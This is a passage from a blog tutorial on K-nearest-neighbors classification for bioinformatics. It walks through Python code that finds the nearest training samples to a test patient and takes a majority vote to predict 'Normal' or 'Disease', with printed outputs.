style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"→ A is closer to C (similar class) than B"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Distance from normal A to disease B: 4.55</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Distance from normal A to normal C: 0.32</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">→ A is closer to C (similar class) than B ✓</span><br></span></code></pre></div></div>
<p>This is the key insight: <strong>samples from the same class are closer together!</strong></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-3-find-k-nearest-neighbors">Step 3: Find K Nearest Neighbors<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#step-3-find-k-nearest-neighbors" class="hash-link" aria-label="Direct link to Step 3: Find K Nearest Neighbors" title="Direct link to Step 3: Find K Nearest Neighbors" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">find_nearest_neighbors</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">query_sample</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> training_data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> training_labels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> k</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Find the K nearest neighbors to a query sample.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Returns:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    - distances: distance to each training sample</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    - indices: index of each training sample</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    - neighbor_labels: class labels of the K nearest neighbors</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Calculate distance from query to all training samples</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    distances </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> i</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> train_sample </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">enumerate</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">training_data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        dist </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> euclidean_distance</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">query_sample</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> train_sample</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">dist</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    distances </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Find indices of K smallest distances</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># argsort returns indices in ascending order</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    k_indices </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">argsort</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">k</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Get labels of K nearest neighbors</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    neighbor_labels </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> training_labels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">k_indices</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    neighbor_distances </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">k_indices</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> neighbor_distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> k_indices</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> neighbor_labels</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Test with a new patient (test sample)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">new_patient </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># First test patient</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">k </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> indices</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> labels </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> find_nearest_neighbors</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">new_patient</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> k</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">k</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"New patient gene expression: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">new_patient</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"\nK=</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">k</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> nearest neighbors:"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> i</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">idx</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> dist</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> label</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">enumerate</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">zip</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">indices</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> labels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    class_name </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Normal"</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> label </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Disease"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"  Neighbor </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">class_name</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> patient (distance: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">dist</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2f</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">)"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">New patient gene expression: [6.53797749 9.18062691]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">K=3 nearest neighbors:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Neighbor 1: Disease patient (distance: 0.38)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Neighbor 2: Disease patient (distance: 0.49)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  Neighbor 3: Disease patient (distance: 0.94)</span><br></span></code></pre></div></div>
<p><strong>What's happening</strong>: All 3 nearest neighbors are disease patients, so the KNN algorithm will predict "Disease" for this new patient.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-4-vote-for-the-class">Step 4: Vote for the Class<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#step-4-vote-for-the-class" class="hash-link" aria-label="Direct link to Step 4: Vote for the Class" title="Direct link to Step 4: Vote for the Class" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">predict_single_sample</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">query_sample</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> training_data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> training_labels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> k</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Predict the class of a query sample using KNN voting.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Algorithm:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    1. Find K nearest neighbors</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    2. Count votes for each class</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    3. Return the most common class (majority vote)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> indices</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> neighbor_labels </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> find_nearest_neighbors</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        query_sample</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> training_data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> training_labels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> k</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Count votes for each class</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    votes </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> Counter</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">neighbor_labels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Return class with most votes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    prediction </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> votes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">most_common</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> prediction</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Predict on a new patient</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">prediction </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> predict_single_sample</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">new_patient</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> k</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">true_label </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> y_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Predicted class: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation string" style="color:hsl(119, 34%, 47%)">'Normal'</span><span class="token string-interpolation interpolation"> </span><span class="token string-interpolation interpolation keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token string-interpolation interpolation"> prediction </span><span class="token string-interpolation interpolation operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token string-interpolation interpolation"> </span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation"> </span><span class="token string-interpolation interpolation keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token string-interpolation interpolation"> </span><span class="token string-interpolation interpolation string" style="color:hsl(119, 34%, 47%)">'Disease'</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"True class: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation string" style="color:hsl(119, 34%, 47%)">'Normal'</span><span class="token string-interpolation interpolation"> </span><span class="token string-interpolation interpolation keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token string-interpolation interpolation"> true_label </span><span class="token string-interpolation interpolation operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token string-interpolation interpolation"> </span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation"> </span><span class="token string-interpolation interpolation keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token string-interpolation interpolation"> </span><span class="token string-interpolation interpolation string" style="color:hsl(119, 34%, 47%)">'Disease'</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Correct: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">prediction </span><span class="token string-interpolation interpolation operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token string-interpolation interpolation"> true_label</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> ✓"</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> prediction </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> true_label </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Correct: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">prediction </span><span class="token string-interpolation interpolation operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token string-interpolation interpolation"> true_label</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> ✗"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Predicted class: Disease</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">True class: Disease</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Correct: True ✓</span><br></span></code></pre></div></div>
<p>Perfect! Our KNN classifier correctly predicted this patient as having the disease. This shows the power of voting: even though one neighbor had distance 0.94, the majority (2 out of 3) voted for disease, leading to the correct prediction.</p>
